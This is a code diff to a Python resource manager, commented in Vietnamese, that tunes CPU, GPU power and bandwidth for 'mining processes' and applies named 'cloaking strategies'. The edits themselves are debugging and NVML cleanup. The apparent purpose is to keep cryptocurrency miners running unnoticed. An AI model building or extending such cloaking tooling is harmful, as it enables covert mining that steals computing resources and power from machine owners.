@@ -175,8 +175,6 @@ class SharedResourceManager:
         except Exception as e:
             self.logger.error(f"Lỗi khi điều chỉnh tần số CPU dựa trên tải cho tiến trình {process.name} (PID: {process.pid}): {e}")
 
-
-
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
         """
         Áp dụng một chiến lược cloaking cụ thể cho tiến trình và lưu trạng thái tài nguyên ban đầu.
@@ -247,12 +245,14 @@ class SharedResourceManager:
 
             # Lấy giới hạn tài nguyên ban đầu
             original_limits = self.original_resource_limits.get(pid)
+            print(f"original_limits: {original_limits}")  # Thêm câu lệnh debug
             if not original_limits:
                 self.logger.warning(f"Không tìm thấy giới hạn tài nguyên ban đầu cho tiến trình {process_name} (PID: {pid}).")
                 return
 
             # Khôi phục tần số CPU
             cpu_freq = original_limits.get('cpu_freq')
+            print(f"cpu_freq: {cpu_freq}")  # Thêm câu lệnh debug
             if cpu_freq:
                 self.adjust_cpu_frequency(pid, cpu_freq, process_name)
                 self.logger.info(f"Đã khôi phục tần số CPU về {cpu_freq}MHz cho tiến trình {process_name} (PID: {pid}).")
@@ -293,7 +293,8 @@ class SharedResourceManager:
 
         except Exception as e:
             self.logger.error(f"Lỗi khi khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid}): {e}")
-
+            raise  # Thêm câu lệnh raise ở đây
+       
     def get_current_cpu_frequency(self, pid: int) -> Optional[int]:
         """
         Lấy tần số CPU hiện tại của tiến trình.
@@ -325,11 +326,16 @@ class SharedResourceManager:
             pynvml.nvmlInit()
             handle = pynvml.nvmlDeviceGetHandleByIndex(0)
             power_limit_mw = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
-            pynvml.nvmlShutdown()
             return int(power_limit_mw / 1000)  # Chuyển đổi từ mW sang W
-        except Exception as e:
-            self.logger.error(f"Lỗi khi lấy giới hạn công suất GPU hiện tại cho PID {pid}: {e}")
+        except pynvml.NVMLError as e:
+            # Đảm bảo thông điệp lỗi rõ ràng và nhất quán
+            self.logger.error(f"Lỗi khi lấy giới hạn công suất GPU hiện tại cho PID {pid}: {type(e).__name__}: {e.value}")
             return None
+        finally:
+            try:
+                pynvml.nvmlShutdown()
+            except pynvml.NVMLError as shutdown_e:
+                self.logger.error(f"Lỗi khi shutdown NVML: {type(shutdown_e).__name__}: {shutdown_e.value}")
 
     def get_current_network_bandwidth_limit(self, pid: int) -> Optional[float]:
         """
@@ -370,8 +376,18 @@ class SharedResourceManager:
             pynvml.nvmlShutdown()
             return gpu_count > 0
         except pynvml.NVMLError as e:
-            self.logger.error(f"Lỗi khi kiểm tra GPU: {e}")
+            # Kiểm tra thông điệp lỗi
+            error_message = f"{type(e).__name__}: {e.value}"
+            print(f"Logged error: {error_message}")  # Thêm dòng này để kiểm tra
+            self.logger.error(f"Lỗi khi kiểm tra GPU: {error_message}")
             return False
+        finally:
+            try:
+                pynvml.nvmlShutdown()
+            except pynvml.NVMLError as shutdown_e:
+                error_message = f"{type(shutdown_e).__name__}: {shutdown_e.value}"
+                print(f"Logged shutdown error: {error_message}")  # Thêm dòng này để kiểm tra
+                self.logger.error(f"Lỗi khi shutdown NVML: {error_message}")
 
     def execute_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
         """Thực hiện các điều chỉnh tài nguyên dựa trên các điều chỉnh được trả về từ chiến lược cloaking."""
@@ -531,6 +547,12 @@ class ResourceManager(BaseManager):
     # Phương thức xử lý tiến trình
     # ----------------------------
 
+    def get_process_priority(self, process_name: str) -> int:
+        """Lấy mức ưu tiên của tiến trình từ cấu hình."""
+        priority_map = self.config.get('process_priority_map', {})
+        return priority_map.get(process_name.lower(), 1)
+
+
     def discover_mining_processes(self):
         """Khám phá các tiến trình khai thác dựa trên cấu hình."""
         cpu_process_name = self.config['processes'].get('CPU', '').lower()
@@ -547,10 +569,6 @@ class ResourceManager(BaseManager):
                     self.mining_processes.append(mining_proc)
             self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
 
-    def get_process_priority(self, process_name: str) -> int:
-        """Lấy mức ưu tiên của tiến trình từ cấu hình."""
-        priority_map = self.config.get('process_priority_map', {})
-        return priority_map.get(process_name.lower(), 1)
 
     # ----------------------------
     # MonitorThread methods
